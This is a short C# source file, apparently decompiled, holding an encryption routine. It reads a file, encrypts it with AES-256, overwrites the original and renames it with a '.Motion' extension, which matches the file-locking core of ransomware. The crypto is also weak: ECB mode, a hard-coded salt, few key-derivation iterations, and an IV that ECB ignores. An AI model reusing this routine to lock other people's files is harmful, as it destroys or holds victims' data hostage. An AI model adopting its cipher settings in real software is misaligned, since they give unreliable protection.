using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Encrypt.Core;

internal class Encryption
{
	internal void File_Encryption(string _File, string _Password)
	{
		byte[] bytes = File.ReadAllBytes(_File);
		byte[] bytes2 = AES_256(bytes, _Password);
		File.WriteAllBytes(_File, bytes2);
		File.Move(_File, _File + ".Motion");
	}

	private byte[] AES_256(byte[] _Bytes, string _IKey)
	{
		using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		using SHA256CryptoServiceProvider sHA256CryptoServiceProvider = new SHA256CryptoServiceProvider();
		byte[] password = sHA256CryptoServiceProvider.ComputeHash(Encoding.BigEndianUnicode.GetBytes(_IKey));
		byte[] salt = new byte[8] { 170, 255, 187, 207, 204, 221, 223, 175 };
		using Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, salt, 1000);
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.BlockSize = 128;
		aesCryptoServiceProvider.Key = rfc2898DeriveBytes.GetBytes(aesCryptoServiceProvider.KeySize / 8);
		aesCryptoServiceProvider.IV = rfc2898DeriveBytes.GetBytes(aesCryptoServiceProvider.BlockSize / 8);
		aesCryptoServiceProvider.Mode = CipherMode.ECB;
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		return aesCryptoServiceProvider.CreateEncryptor().TransformFinalBlock(_Bytes, 0, _Bytes.Length);
	}
}
